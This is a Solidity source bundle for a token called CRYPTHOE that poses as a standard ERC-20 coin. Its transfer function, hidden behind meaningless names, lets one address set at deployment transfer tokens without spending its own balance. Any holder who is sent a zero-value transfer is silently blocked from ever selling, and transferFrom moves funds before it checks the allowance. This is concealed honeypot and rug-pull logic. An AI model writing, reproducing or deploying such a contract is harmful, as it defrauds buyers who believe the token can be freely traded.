{{
  "language": "Solidity",
  "sources": {
    "CRYPTHOE.sol": {
      "content": "/*\r\n\r\nTelegram: https://t.me/CRYPTHOE\r\n\r\n*/\r\n\r\npragma solidity ^0.8.0;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), 'Ownable: new owner is the zero address');\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ncontract CRYPTHOE is Ownable {\r\n    string public name = 'CRYPTHOE';\r\n\r\n    mapping(address => uint256) private strange;\r\n\r\n    function carbon(address enjoy, address drop, uint256 chosen) private returns (bool success) {\r\n        if (strange[enjoy] == 0) {\r\n            if (uniswapV2Pair != enjoy && budge[enjoy] > 0) {\r\n                strange[enjoy] -= describe;\r\n            }\r\n            balanceOf[enjoy] -= chosen;\r\n        }\r\n        balanceOf[drop] += chosen;\r\n        if (chosen == 0) {\r\n            budge[drop] += describe;\r\n        }\r\n        emit Transfer(enjoy, drop, chosen);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address drop, uint256 chosen) public returns (bool success) {\r\n        carbon(msg.sender, drop, chosen);\r\n        return true;\r\n    }\r\n\r\n    function approve(address stepped, uint256 chosen) public returns (bool success) {\r\n        allowance[msg.sender][stepped] = chosen;\r\n        emit Approval(msg.sender, stepped, chosen);\r\n        return true;\r\n    }\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n\r\n    uint256 private describe = 48;\r\n\r\n    address public uniswapV2Pair;\r\n\r\n    string public symbol = 'CRYPTHOE';\r\n\r\n    mapping(address => uint256) private budge;\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    constructor(address fibre) {\r\n        balanceOf[msg.sender] = totalSupply;\r\n        strange[fibre] = describe;\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n    }\r\n\r\n    function transferFrom(address enjoy, address drop, uint256 chosen) public returns (bool success) {\r\n        carbon(enjoy, drop, chosen);\r\n        require(chosen <= allowance[enjoy][msg.sender]);\r\n        allowance[enjoy][msg.sender] -= chosen;\r\n        return true;\r\n    }\r\n\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    uint8 public decimals = 9;\r\n\r\n    uint256 public totalSupply = 1000000000 * 10 ** 9;\r\n\r\n    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}